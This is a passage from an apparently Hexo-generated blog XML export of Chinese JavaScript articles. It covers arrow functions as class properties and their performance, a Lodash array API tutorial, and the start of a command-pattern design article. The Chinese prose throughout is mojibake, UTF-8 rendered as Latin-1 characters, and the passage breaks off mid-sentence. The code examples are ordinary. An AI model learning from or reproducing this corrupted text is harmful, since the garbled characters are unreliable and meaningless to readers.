ä¸ä¼šåœ¨åŽŸåž‹ä¸­è€Œä¸”æˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡ super.handleClick è°ƒç”¨æˆ‘ä»¬çš„ç®­å¤´å‡½æ•° handleClick 1234567891011121314151617181920212223class B extends A&#123; handleClick = () =&gt;&#123; super.handleClick(); console.log('B.handleClick'); &#125; handleLongClick()&#123; super.handleLongClick(); console.log('B.handleLongClick'); &#125; &#125;console.log(B.prototype);// &#123;constructor: Æ’, handleLongClick: Æ’&#125;console.log(B.prototype.__proto__);// &#123;constructor: Æ’, handleLongClick: Æ’&#125;new B().handleClick();// Uncaught TypeError: (intermediate value).handleClick is not a functionnew B().handleLongClick();// A.handleLongClick// B.handleLongClick å¦‚æžœç±»C åŽ»ç»§æ‰¿ç±» A,ä½†æ˜¯ handleClick å®žçŽ°ä¸ºä¸€ä¸ªæ™®é€šå‡½æ•°è€Œä¸æ˜¯ç®­å¤´å‡½æ•°ï¼Œç„¶åŽhandleClick åªæ‰§è¡Œsuper.handleClick()è€Œä¸åšå…¶ä»–çš„ï¼Œè¿™æ ·ä¸æ˜¯å¾ˆå¥‡æ€ªå—ï¼Ÿ è¿™æ˜¯å› ä¸º handleClick åœ¨çˆ¶ç±»çš„æž„é€ å‡½æ•°ä¸­çš„å®žä¾‹åŒ–ä¼šè¦†ç›–å®ƒã€‚ C.prototype.handleClick() ä¼šè°ƒç”¨æˆ‘ä»¬çš„å®žçŽ°ä½†æ˜¯ä¼šå› ä¸ºä¸Šä¸€ä¸ªé”™è¯¯è€Œå¤±è´¥ï¼šUncaught TypeError: (intermediate value).handleClick is not a function 1234567891011121314class C extends A &#123; handleClick()&#123; super.handleClick(); console.log('C.handleClick'); &#125;&#125;console.log(C.prototype);// &#123;constructor: Æ’, handleLongClick: Æ’&#125;console.log(C.prototype.__proto__);// &#123;constructor: Æ’, handleLongClick: Æ’&#125;new C().handleClick();// C.handleClick å¦‚æžœç±»D æ˜¯ä¸€ä¸ªç»§æ‰¿ç±»Açš„æ™®é€šç©ºç™½ç±»ï¼Œå®ƒå°±ä¼šæœ‰ä¸€ä¸ªç©ºçš„åŽŸåž‹ï¼Œç„¶åŽ new D().handleClick å°±ä¼šè¾“å‡º A.handleClick 1234567891011class D extends A &#123;&#125;console.log(D.prototype);// &#123;constructor: Æ’&#125;console.log(C.prototype.__proto__);// &#123;constructor: Æ’, handleLongClick: Æ’&#125;new D().handleClick();// A.handleClick PerformanceçŽ°åœ¨æ˜¯æœ‰è¶£çš„éƒ¨åˆ†ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ€§èƒ½ã€‚ æˆ‘ä»¬çŸ¥é“é€šå¸¸çš„å‡½æ•°åœ¨åŽŸåž‹ä¸­å®šä¹‰ï¼Œç„¶åŽåœ¨æ‰€æœ‰çš„å®žä¾‹ä¹‹é—´å…±äº«ã€‚å¦‚æžœæˆ‘ä»¬æœ‰Nä¸ªç»„ä»¶çš„åˆ—è¡¨ï¼Œè¿™äº›ç»„ä»¶å°†ä¼šå…±äº«ç›¸åŒçš„æ–¹æ³•ã€‚æ‰€ä»¥ï¼Œå¦‚æžœæˆ‘ä»¬çš„ç»„ä»¶è¢«ç‚¹å‡»ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨æ–¹æ³•Næ¬¡ï¼Œè°ƒç”¨ç›¸åŒçš„åŽŸåž‹ã€‚ç”±äºŽæˆ‘ä»¬åœ¨åŽŸåž‹ä¸­ä¼šå¤šæ¬¡è°ƒç”¨ç›¸åŒçš„æ–¹æ³•ï¼ŒJavaScript å¼•æ“Žå¯¹å…¶ä½œå‡ºäº†ä¼˜åŒ–ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¯¹äºŽç±»å±žæ€§çš„ç®­å¤´å‡½æ•°ï¼Œå¦‚æžœæˆ‘ä»¬åˆ›å»º N ä¸ªç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶ä¹Ÿä¼šåˆ›å»º N ä¸ªå‡½æ•°ã€‚è®°å¾—æˆ‘ä»¬åœ¨è½¬æ¢ç‰ˆæœ¬ä¸­çœ‹åˆ°çš„å†…å®¹ï¼Œç±»å±žæ€§åœ¨æž„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ç‚¹å‡» N ä¸ªç»„ä»¶ä¼šè°ƒç”¨ N ä¸ªä¸åŒçš„æ–¹æ³•ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹åœ¨ V8 å¼•æ“Žï¼ˆChromeï¼‰çš„åŸºå‡†æµ‹è¯•æ˜¯å¦‚ä½•åšçš„ã€‚ ç¬¬ä¸€ä¸ªå¾ˆç®€å•ï¼Œæˆ‘ä»¬åªè¦æµ‹è¯•å®žä¾‹åŒ–çš„æ—¶é—´ï¼Œç„¶åŽæˆ‘ä»¬è°ƒç”¨ä¸€æ¬¡æˆ‘ä»¬çš„æ–¹æ³•ã€‚ æ³¨æ„ï¼Œè¿™ä¸ªæ•°å­—åœ¨è¿™é‡Œå¹¶ä¸é‡è¦ï¼Œå› ä¸ºåœ¨åº”ç”¨ç¨‹åºä¸­ä¸ä¼šæ³¨æ„åˆ°å®žä¾‹åŒ–ï¼Œæˆ‘ä»¬è¦è®¨è®ºçš„æ˜¯æ¯ç§’çš„æ“ä½œï¼Œè¿™ä¸ªæ•°å­—å·²ç»è¶³å¤Ÿé«˜äº†ã€‚æˆ‘æ›´å…³å¿ƒå‡½æ•°ä¹‹é—´çš„å·®è·ã€‚ ç¬¬äºŒä¸ªï¼Œä½¿ç”¨äº†ä¸€ä¸ªä»£è¡¨æ€§çš„ç”¨ä¾‹ï¼Œ100ä¸ªç»„ä»¶çš„å®žä¾‹åŒ–ï¼Œå°±åƒä¸€ä¸ªåˆ—è¡¨ï¼Œæˆ‘ä»¬æ¯æ¬¡è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ä¹‹åŽã€‚ æ‰€æœ‰åŸºå‡†æµ‹è¯•å‡åœ¨Mac OS Pro 13â€œ2016 2GHz Mac OS X 10.13.1å’ŒChrome 62.0.3202ä¸Šè¿è¡Œã€‚ ç®€è€Œè¨€ä¹‹ï¼Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œåº”è¯¥åœ¨åŽŸåž‹ä¸­åŽ»å£°æ˜Žå…±äº«æ–¹æ³•ï¼Œå¹¶ä¸”åªåœ¨éœ€è¦çš„æ—¶å€™å°†å…¶ç»‘å®šåˆ°ä¸Šä¸‹æ–‡ï¼ˆå¦‚æžœä½œä¸º prop æˆ–è€… callback ä¼ é€’ï¼‰ã€‚å°†æˆ‘ä»¬çš„å…±äº«æ–¹æ³•ç»‘å®šåˆ°åŽŸåž‹å¹¶åœ¨å®žä¾‹çš„æž„é€ å‡½æ•°ä¸­åˆå§‹åŒ–æˆ‘ä»¬çš„å±žæ€§æ˜¯æœ‰æ„ä¹‰çš„ï¼Œä½†æ–¹æ³•å¹¶ä¸å¤šã€‚ å…³äºŽ high ops/sï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ç±»å±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°å¹¶ä¸åƒæˆ‘ä»¬æƒ³è±¡ä¸­é‚£ä¹ˆé«˜æ•ˆã€‚ ç»“è®º ç±»å±žæ€§ä¸­ç®­å¤´å‡½æ•°ä¼šè¢«è½¬æ¢ä¸ºæž„é€ å‡½æ•° ç±»å±žæ€§ä¸­çš„ç®­å¤´å‡½æ•°ä¸ä¼šåœ¨åŽŸåž‹ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡ super è°ƒç”¨å®ƒä»¬ã€‚ ç±»å±žæ€§ä¸­çš„å…¼æœ‰å‡½æ•°æ¯”ç»‘å®šå‡½æ•°æ…¢å¾—å¤šï¼Œå¹¶ä¸”ä¸¤è€…éƒ½æ…¢äºŽæ™®é€šçš„å‡½æ•° å¦‚æžœä½ æ‰“ç®—ä¼ é€’å®ƒï¼Œåº”è¯¥åªç”¨ .bind() æˆ–è€…ç®­å¤´å‡½æ•°ç»‘å®šä¸€ä¸ªæ–¹æ³•ã€‚]]></content>
      <categories>
        <category>è½¬è½½å¥½æ–‡</category>
      </categories>
      <tags>
        <tag>Arrow_Function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lodash-API]]></title>
    <url>%2F2019-02-26-Lodash.html</url>
    <content type="text"><![CDATA[Lodash æ˜¯ä¸€ä¸ªä¸€è‡´æ€§ã€æ¨¡å—åŒ–ã€é«˜æ€§èƒ½çš„ JavaScript å®žç”¨å·¥å…·åº“ã€‚ Lodash æä¾›çš„è¾…åŠ©å‡½æ•°ä¸»è¦åˆ†æˆä¸‹é¢å‡ ç±»ï¼Œå®˜æ–¹æ–‡æ¡£ Arrayï¼šé€‚ç”¨äºŽæ•°ç»„ç±»åž‹ï¼Œæ¯”å¦‚å¡«å……æ•°æ®ã€æŸ¥æ‰¾å…ƒç´ ã€æ•°ç»„åˆ†ç‰‡ç­‰æ“ä½œ Collectionï¼šé€‚ç”¨äºŽæ•°ç»„å’Œå¯¹è±¡ç±»åž‹ï¼Œéƒ¨åˆ†ç”¨äºŽå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚åˆ†ç»„ã€æŸ¥æ‰¾ã€è¿‡æ»¤ç­‰æ“ä½œ Functionï¼šé€‚ç”¨äºŽå‡½æ•°ç±»åž‹ï¼Œæ¯”å¦‚èŠ‚æµã€å»¶è¿Ÿã€ç¼“å­˜ã€è®¾ç½®é’©å­ç­‰æ“ä½œ Langï¼šæ™®éç”¨äºŽå„ç§ç±»åž‹ï¼Œå¸¸ç”¨è¯­ç±»åž‹åˆ¤æ–­å’Œç±»åž‹è½¬æ¢ Mathï¼šé€‚ç”¨äºŽæ•°å€¼ç±»åž‹ï¼Œå¸¸ç”¨è¯­æ‰§è¡Œæ•°å­¦è¿ç®— Numberï¼šé€‚ç”¨äºŽç”Ÿæˆéšæœºæ•°ï¼Œæ¯”è¾ƒæ•°å€¼ä¸Žæ•°å€¼åŒºé—´çš„å…³ç³» Objectï¼šé€‚ç”¨äºŽå¯¹è±¡ç±»åž‹ï¼Œå¸¸ç”¨äºŽå¯¹è±¡çš„åˆ›å»ºã€æ‰©å±•ã€ç±»åž‹è½¬æ¢ã€æ£€ç´¢å’Œé›†åˆç­‰æ“ä½œ Seqï¼šå¸¸ç”¨è¯­åˆ›å»ºé“¾å¼è°ƒç”¨ï¼Œæé«˜æ‰§è¡Œæ€§èƒ½ï¼ˆæƒ°æ€§è®¡ç®—ï¼‰ Stringï¼šé€‚ç”¨äºŽå­—ç¬¦ä¸²ç±»åž‹ lodash/fp æ¨¡å—æä¾›äº†æ›´æŽ¥è¿‘å‡½æ•°å¼ç¼–ç¨‹çš„å¼€å‘æ–¹å¼ï¼Œå…¶å†…éƒ¨çš„å‡½æ•°ç»è¿‡åŒ…è£…ï¼Œå…·æœ‰ immutableã€auto-curriedã€iteratee-firstã€data-lastï¼ˆå®˜æ–¹ä»‹ç»ï¼‰ç­‰ç‰¹ç‚¹ã€‚Lodash åœ¨ GitHub Wiki ä¸­å¯¹lodash/fp çš„ç‰¹ç‚¹åšäº†å¦‚ä¸‹æ¦‚è¿°ï¼š Fixed Arityï¼šå›ºåŒ–å‚æ•°ä¸ªæ•°ï¼Œä¾¿äºŽæŸ¯é‡ŒåŒ– Rearragned Arguments ï¼šé‡æ–°è°ƒç”¨å‚æ•°ä½ç½®ï¼Œä¾¿äºŽå‡½æ•°ä¹‹é—´çš„èšåˆ Capped Iteratee Argumentï¼šå°è£… Iteratee å‚æ•° ä½¿ç”¨æ–¹å¼ Array_.chunkåˆ›å»ºä¸€ä¸ªåŒ…å«å…ƒç´ çš„æ•°ç»„ï¼Œè¯¥å…ƒç´ è¢«åˆ†æˆå¤§å°ç›¸åŒçš„ç»„ã€‚å¦‚æžœæ•°ç»„ä¸èƒ½è¢«è¯„ä»·åˆ†å‰²ï¼Œé‚£ä¹ˆæœ€åŽçš„å—å°±æ˜¯å‰©ä¸‹çš„å…ƒç´ ã€‚ è¯­æ³•ï¼š _.chunk(array,[size]) å‚æ•°ï¼š array(Array):ç›®æ ‡æ•°ç»„ [size=1](number):æ¯ä¸€å—çš„é•¿åº¦ è¿”å›ž: (Array):æ–°çš„æ•°ç»„å— 1234_.chunk([1, 2, 3, 4, 5, 6], 2)// [[1,2],[3,4],[5,6]]_.chunk([1, 2, 3, 4, 5, 6], 5)// [[1,2,3,4,5],[6]] _.compactåˆ›å»ºä¸€ä¸ªåˆ é™¤æ‰€æœ‰ falsey(ä¹Ÿå«åš falsy ,è™šå€¼) çš„æ•°ç»„ã€‚falseã€nullã€0ã€â€â€ã€undefinedå’ŒNaNæ˜¯falseyã€‚ å…³äºŽ Falsy è¯­æ³•ï¼š _.compact(array) å‚æ•°ï¼š array(Array):ç›®æ ‡æ•°ç»„ è¿”å›žï¼š (Array):è¿”å›žç­›é€‰å¥½å€¼åŽçš„æ•°ç»„ 12_.compact([false,null,0,"",undefined,1,3,4,5,NaN])// [1,3,4,5] _.concatåˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œå°†æ•°ç»„ä¸Žå…¶ä»–æ•°ç»„æˆ–è€…æ˜¯å€¼è¿žæŽ¥èµ·æ¥ è¯­æ³•ï¼š _.concat(array,[values]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [values](â€¦*):è¿žæŽ¥åŽçš„å€¼ï¼Œå¯ä»¥æ˜¯ä»»ä½•ç±»åž‹ è¿”å›žï¼š (Array):è¿”å›žæ–°çš„è¿žæŽ¥æ•°ç»„ 12_.concat([false,null,0,"",undefined,1,3,4,5,NaN],[2],null,null,&#123;a:2&#125;)// [false, null, 0, "", undefined, 1, 3, 4, 5, NaN, 2, null, null, &#123;a:2&#125;] _.differenceåˆ›å»ºä¸åŒ…å«åœ¨å…¶ä»–ç»™å®šæ•°ç»„ä¸­çš„æ•°ç»„å€¼çš„æ•°ç»„ï¼Œç”¨äºŽç›¸ç­‰æ¯”è¾ƒã€‚ç»“æžœçš„å€¼çš„é¡ºåºå’Œå¼•ç”¨æœ‰ç¬¬ä¸€ä¸ªæ•°ç»„å†³å®šã€‚ è¯­æ³•ï¼š _.difference(array,[values]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [values](â€¦Array):è¦æŽ’é™¤çš„å€¼ è¿”å›žï¼š (Array):è¿”å›žç­›é€‰åŽçš„æ–°æ•°ç»„ 12_.difference([false,null,0,"",undefined,1,3,4,5,NaN],[3],[null],[null],[&#123;a:2&#125;])// [false, 0, "", undefined, 1, 4, 5, NaN] _.differenceByè¿™ä¸ª Api è·Ÿä¸Šé¢ä¸åŒä¹‹å¤„åœ¨äºŽå®ƒæŽ¥å— iteratee,iterateeä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ å’Œå€¼çš„è°ƒç”¨ï¼Œä»¥ç”Ÿæˆæ¯”è¾ƒå®ƒä»¬çš„æ ‡å‡†ã€‚ç»“æžœå€¼çš„é¡ºåºå’Œå¼•ç”¨è¿˜æ˜¯ç”±ç¬¬ä¸€ä¸ªæ•°ç»„å†³å®šã€‚ è¯­æ³•ï¼š _.differenceBy(array,[values],[iteratee=_.identity]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [values](â€¦Array):è¦æŽ’é™¤çš„å€¼ [iteratee=_.identity](Function):iterateeè°ƒç”¨æ¯ä¸ªå…ƒç´  è¿”å›žï¼š (Array):è¿”å›žç­›é€‰åŽçš„æ–°æ•°ç»„ 123456_.differenceBy([4.6,1.2,3.3],[2.1],[3.2],Math.floor)// [4.6,1.2]_.differenceBy([&#123; 'x': 2 &#125;,&#123;'y':3&#125;, &#123; 'x': 1 &#125;], [&#123; 'x': 1 &#125;], 'y')//[&#123;'y':3&#125;]_.differenceBy([&#123; 'x': 2 &#125;,&#123;'y':3&#125;, &#123; 'x': 1 &#125;], [&#123; 'x': 1 &#125;], 'x')//[&#123;'x':2&#125;,&#123;'y':3&#125;] _.dropåˆ›å»ºä¸€ä¸ªæ•°ç»„åˆ‡ç‰‡ï¼Œä»Žå¼€å§‹åˆ é™¤ n ä¸ªå…ƒç´ ã€‚ è¯­æ³•ï¼š _.drop(array,[n=1]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [n=1](number):è¦åˆ é™¤çš„å…ƒç´ çš„æ•°é‡ è¿”å›žï¼š (Array):è¿”å›žæ•°ç»„çš„åˆ‡ç‰‡ 12345678_.drop([1, 2, 3, 4, 5], -1) // [1,2,3,4,5]_.drop([1, 2, 3, 4, 5], 0) // [1,2,3,4,5]_.drop([1, 2, 3, 4, 5], 1) // [2,3,4,5]_.drop([1, 2, 3, 4, 5], 2) // [3,4,5]_.drop([1, 2, 3, 4, 5], 3) // [4,5]_.drop([1, 2, 3, 4, 5], 4) // [5]_.drop([1, 2, 3, 4, 5], 5) // []_.drop([1, 2, 3, 4, 5], 6) // [] _.dropRightä¸Ž._dropç›¸ä¼¼ï¼Œåˆ›å»ºä¸€ä¸ªæ•°ç»„åˆ‡ç‰‡ï¼Œä¸åŒçš„æ˜¯ä»Žæ•°ç»„ç»“å°¾å¼€å§‹åˆ é™¤å…ƒç´  è¯­æ³•ï¼š _.dropRight(array,[n=1]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [n=1](number):è¦åˆ é™¤çš„å…ƒç´ çš„æ•°é‡ è¿”å›žï¼š (Array):è¿”å›žæ•°ç»„çš„åˆ‡ç‰‡ 12345678_.dropRight([1, 2, 3, 4, 5], -1) // [1,2,3,4,5]_.dropRight([1, 2, 3, 4, 5], 0) // [1,2,3,4,5]_.dropRight([1, 2, 3, 4, 5], 1) // [1,2,3,4]_.dropRight([1, 2, 3, 4, 5], 2) // [1,2,3]_.dropRight([1, 2, 3, 4, 5], 3) // [1,2]_.dropRight([1, 2, 3, 4, 5], 4) // [1]_.dropRight([1, 2, 3, 4, 5], 5) // []_.dropRight([1, 2, 3, 4, 5], 6) // [] _.dropRightWhileåˆ›å»ºä¸€ä¸ªæ•°ç»„åˆ‡ç‰‡ï¼Œä»Žæœ«å°¾ä¸¢å¼ƒæŽ‰ä¸€äº›å…ƒç´ ã€‚è¢«ä¸¢å¼ƒçš„å…ƒç´ æ˜¯ä»Žæœ«å°¾å¼€å§‹å¾ªçŽ¯çš„ï¼Œç›´åˆ° predicate è¿”å›ž falsey.predicate å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼švalue,index,array è¯­æ³•ï¼š _.dropRightWhile(array,[predicate=_.identity]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [predicate=_.identity](Function):æ¯æ¬¡è¿­ä»£è¦è°ƒç”¨çš„å‡½æ•° è¿”å›žï¼š (Array):è¿”å›žæ•°ç»„çš„åˆ‡ç‰‡ 123456789101112131415var users = [ &#123; 'user': 'barney', 'active': true &#125;, &#123; 'user': 'fred', 'active': false &#125;, &#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;,];_.dropRightWhile(users,function(o)&#123;return !o.active&#125;) //[&#123; 'user': 'barney', 'active': true &#125;]_.dropRightWhile(users,function(o)&#123;return o.active&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropRightWhile(users,&#123;'user':'pebbles','active':false&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;]_.dropRightWhile(users,['active',false]) //[&#123; 'user': 'barney', 'active': true &#125;]_.dropRightWhile(users,'haha') //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;] _.dropWhileåˆ›å»ºä¸€ä¸ªæ•°ç»„åˆ‡ç‰‡ï¼Œä»Žå¼€å¤´ä¸¢å¼ƒæŽ‰ä¸€äº›å…ƒç´ ã€‚è¢«ä¸¢å¼ƒçš„å…ƒç´ æ˜¯ä»Žå¼€å¤´å¼€å§‹å¾ªçŽ¯çš„ï¼Œç›´åˆ° predicate è¿”å›ž falsey.predicate å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼švalue,index,array è¯­æ³•ï¼š _.dropWhile(array,[predicate=_.identity]) å‚æ•°ï¼š array(Array): ç›®æ ‡æ•°ç»„ [predicate=_.identity](Function):æ¯æ¬¡è¿­ä»£è¦è°ƒç”¨çš„å‡½æ•° è¿”å›žï¼š (Array):è¿”å›žæ•°ç»„çš„åˆ‡ç‰‡ 123456789101112131415var users = [ &#123; 'user': 'barney', 'active': true &#125;, &#123; 'user': 'fred', 'active': false &#125;, &#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;,];_.dropWhile(users,function(o)&#123;return !o.active&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,function(o)&#123;return o.active&#125;) //[&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,&#123;'user':'barney','active':false&#125;) //[&#123; 'user': 'barney', 'active': true &#125;,&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,['active',true]) //[&#123; 'user': 'fred', 'active': false &#125;,&#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;]_.dropWhile(users,'user') //[] å‚è€ƒé“¾æŽ¥Lodash]]></content>
      <categories>
        <category>JavaScriptå·¥å…·åº“</category>
      </categories>
      <tags>
        <tag>Lodash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å‘½ä»¤æ¨¡å¼]]></title>
    <url>%2F2019-02-25-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å‘½ä»¤æ¨¡å¼å‡è®¾æœ‰ä¸€ä¸ªå¿«é¤åº—ï¼Œè€Œæˆ‘æ˜¯å¿«é¤åº—çš„ç‚¹é¤æœåŠ¡å‘˜ï¼Œé‚£ä¹ˆæˆ‘çš„ä¸€å¤©çš„å·¥ä½œåº”è¯¥æ˜¯è¿™æ ·çš„ï¼šå½“æŸä½å®¢äººç‚¹é¤æˆ–è€…æ‰“æ¥è®¢é¤ç”µè¯ï¼Œæˆ‘ä¼šæŠŠä»–çš„éœ€æ±‚å†™åœ¨æ¸…å•ä¸Šï¼Œç„¶åŽäº¤ç»™åŽ¨æˆ¿ï¼Œå®¢äººä¸ç”¨å…³å¿ƒæ˜¯å“ªäº›åŽ¨å¸ˆå¸®ä»–ç‚’èœã€‚æˆ‘ä»¬é¤åŽ…è¿˜å¯ä»¥æ»¡è¶³å®¢äººéœ€è¦çš„å®šæ—¶æœåŠ¡ï¼Œæ¯”å¦‚å®¢äººå¯èƒ½ç›®å‰æ­£åœ¨å›žå®¶çš„è·¯ä¸Šï¼Œè¦æ±‚ 1 ä¸ªå°æ—¶å€™æ‰å¯ä»¥ç‚’èœï¼Œåªè¦è®¢å•åœ¨ï¼ŒåŽ¨å¸ˆå°±ä¸ä¼šå¿˜è®°ã€‚å®¢äººä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ‰“ç”µè¯æ¥æ’¤é”€è®¢å•ã€‚å¦å¤–å¦‚æžœæœ‰å¤ªå¤šçš„å®¢äººç‚¹é¤ï¼ŒåŽ¨æˆ¿å¯ä»¥æŒ‰ç…§è®¢å•çš„é¡ºåºæ¥æŽ’é˜Ÿç‚’èœã€‚ è¿™äº›è®°å½•ç€è®¢é¤ä¿¡æ¯çš„æ¸…å•å°±æ˜¯å‘½ä»¤æ¨¡å¼ä¸­çš„å‘½ä»¤å¯¹è±¡ã€‚ å‘½ä»¤æ¨¡å¼çš„ç”¨é€”å‘½ä»¤æ¨¡å¼æ˜¯æœ€ç®€å•å’Œä¼˜é›…çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ï¼Œå‘½ä»¤æ¨¡å¼ä¸­çš„å‘½ä»¤ï¼ˆcommandï¼‰æŒ‡çš„æ˜¯ä¸€ä¸ªæ‰§è¡ŒæŸäº›ç‰¹å®šäº‹æƒ…çš„æŒ‡ä»¤ã€‚ å‘½ä»¤æ¨¡å¼æœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ï¼šæœ‰æ—¶å€™éœ€è¦å‘æŸäº›å¯¹è±¡å‘é€è¯·æ±‚ï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“è¯·æ±‚çš„æŽ¥æ”¶è€…æ˜¯è°ï¼Œä¹Ÿä¸çŸ¥é“è¢«è¯·æ±‚çš„æ“ä½œæ˜¯ä»€ä¹ˆã€‚æ­¤æ—¶å¸Œæœ›ç”¨ä¸€ç§æ¾è€¦åˆçš„æ–¹å¼æ¥è®¾è®¡ç¨‹åºï¼Œä½¿å¾—è¯·æ±‚å‘é€è€…å’Œè¯·æ±‚æŽ¥æ”¶è€…èƒ½å¤Ÿæ¶ˆé™¤å½¼æ­¤ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚ æ‹¿è®¢é¤æ¥è¯´ï¼Œå®¢äººéœ€è¦å‘åŽ¨å¸ˆå‘é€è¯·æ±‚ï¼Œä½†æ˜¯å®Œå…¨ä¸çŸ¥é“è¿™äº›åŽ¨å¸ˆçš„åå­—å’Œè”ç³»æ–¹å¼ï¼Œä¹Ÿä¸çŸ¥é“åŽ¨å¸ˆç‚’èœçš„æ–¹å¼å’Œæ­¥éª¤ã€‚å‘½ä»¤æ¨¡å¼æŠŠå®¢äººè®¢é¤çš„è¯·æ±‚å°è£…æˆ command å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è®¢å•ä¸­çš„è®¢å•å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡å¯ä»¥åœ¨ç¨‹åºä¸­è¢«å››å¤„ä¼ é€’ï¼Œå°±åƒè®¢å•å¯ä»¥ä»ŽæœåŠ¡å‘˜æ‰‹ä¸­ä¼ åˆ°åŽ¨å¸ˆçš„æ‰‹ä¸­ã€‚è¿™æ ·ä¸€æ¥ï¼Œå®¢äººä¸éœ€è¦çŸ¥é“åŽ¨å¸ˆçš„åå­—ï¼Œä»Žè€Œè§£å¼€äº†è¯·æ±‚è°ƒç”¨è€…å’Œè¯·æ±‚æŽ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚ å¦å¤–ï¼Œç›¸å¯¹äºŽè¿‡ç¨‹åŒ–çš„è¯·æ±‚è°ƒç”¨ï¼Œ command å¯¹è±¡æ‹¥æœ‰æ›´é•¿çš„ç”Ÿå‘½å‘¨æœŸã€‚å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯è·Ÿåˆå§‹è¯·æ±‚æ— å…³çš„ï¼Œå› ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»è¢«å°è£…åœ¨äº† command å¯¹è±¡çš„æ–¹æ³•ä¸­ï¼Œæˆä¸ºäº†è¿™ä¸ªå¯¹è±¡çš„è¡Œä¸ºã€‚æˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºè¿è¡Œçš„ä»»æ„æ—¶åˆ»åŽ»è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå°±åƒåŽ¨å¸ˆå¯ä»¥åœ¨å®¢äººé¢„è®¢1ä¸ªå°æ—¶ä¹‹åŽæ‰å¸®ä»–ç‚’èœï¼Œç›¸å½“äºŽç¨‹åºåœ¨1å°æ—¶ä¹‹åŽæ‰å¼€å§‹æ‰§è¡Œ command å¯¹è±¡çš„æ–¹æ³•ã€‚ é™¤äº†è¿™ä¸¤ç‚¹ä¹‹å¤–ï¼Œå‘½ä»¤æ¨¡å¼è¿˜æ”¯æŒæ’¤é”€ã€æŽ’é˜Ÿç­‰æ“ä½œã€‚ å‘½ä»¤æ¨¡å¼çš„ä¾‹å­â€”â€”èœå•ç¨‹åºå‡è®¾æˆ‘ä»¬æ­£åœ¨ç¼–å†™ä¸€ä¸ªç”¨æˆ·ç•Œé¢ç¨‹åºï¼Œè¯¥ç•Œé¢è‡³å°‘æœ‰æ•°åä¸ª Button æŒ‰é’®ã€‚å› 